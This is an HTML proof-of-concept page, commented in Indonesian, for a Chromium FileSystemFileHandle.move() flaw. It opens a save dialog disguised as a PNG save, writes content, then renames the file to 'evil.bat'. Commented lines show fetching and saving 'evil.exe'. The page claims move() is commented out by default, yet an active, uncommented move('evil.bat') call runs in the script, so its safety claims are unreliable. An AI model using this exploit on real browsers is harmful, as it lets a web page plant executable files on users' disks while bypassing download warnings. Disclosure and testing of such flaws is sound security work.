<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>PoC FileSystemFileHandle.move()</title>
  <style>
    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; padding: 2rem; }
    pre { background:#f6f6f6; padding:1rem; border-radius:6px; max-width:900px; white-space:pre-wrap; }
    .danger { color: #8b0000; font-weight:700; }
  </style>
</head>
<body>
  <h2>PoC — FileSystemFileHandle.move()</h2>

  <p class="danger">PERINGATAN: Jangan jalankan <code>move()</code> di mesin utama. Gunakan VM / environment terisolasi.</p>

  <p>
    Tekan tombol untuk menjalankan skrip PoC. Fungsi akan:
    <ol>
      <li>memanggil <code>showSaveFilePicker</code> dengan <code>suggestedName: "hello"</code>,</li>
      <li>menulis konten sederhana, lalu</li>
      <li><em>opsional</em> memanggil <code>fileHandle.move("evil.bat")</code> (dikomentari - uncomment jika ingin menguji di VM).</li>
    </ol>
  </p>

  <button id="run">Jalankan PoC</button>

  <pre id="log"></pre>

  <script>
    const logEl = document.getElementById('log');
    function log(...args) { logEl.textContent += args.join(' ') + '\\n'; console.log(...args); }

    document.getElementById('run').addEventListener('click', async () => {
      try {
        log('1) Memanggil showSaveFilePicker({ suggestedName: "hello", startIn: "desktop", accept: image/png }) ...');
        const fileHandle = await window.showSaveFilePicker({
          suggestedName: `hello`,
          startIn: "desktop",
          types: [{
            description: ['ImageFile'],
            accept: {
              'image/png': ['.png']
            },
          }],
        });
        log('2) File handle diterima:', fileHandle);

        log('3) Membuat writable stream dan menulis konten ...');
        const writableStream = await fileHandle.createWritable();
            // 3.1 Write malicious file data to download, saved as exe
    // const evilFile = await fetch(`evil.exe`)
    // await evilFile.body.pipeTo(writableStream)
    // fileHandle.move("evil.exe")
    // 3.2 Or write custom content and close the stream, e.g., .bat
    await writableStream.write(new TextEncoder().encode(`calc`));
    await writableStream.close();
    fileHandle.move("evil.bat")
        log('4) Tertulis: konten demo ditutup.');

        // ======= POTENSI BERBAHAYA: Uncomment pada environment terisolasi untuk menguji =======
        // NOTE: Pada versi Chromium yang rentan, pemanggilan move() setelah save dapat mengganti
        // nama/ekstensi tanpa dialog peringatan tambahan. HANYA UNCOMMENT jika di VM aman.
        //
        // log('5) Menjalankan fileHandle.move("evil.bat")  — ***BERBAHAYA***');
        // try {
        //   await fileHandle.move("evil.bat");
        //   log('move() selesai. Periksa folder (desktop/documents/downloads) untuk file evil.bat');
        // } catch (err) {
        //   log('move() gagal / dilempar error:', err && err.message);
        // }

        log('Selesai. (move() dikomentari secara default)');
      } catch (error) {
        log('Error / user cancelled:', error && (error.message || error.toString()));
      }
    });
  </script>
</body>
</html>
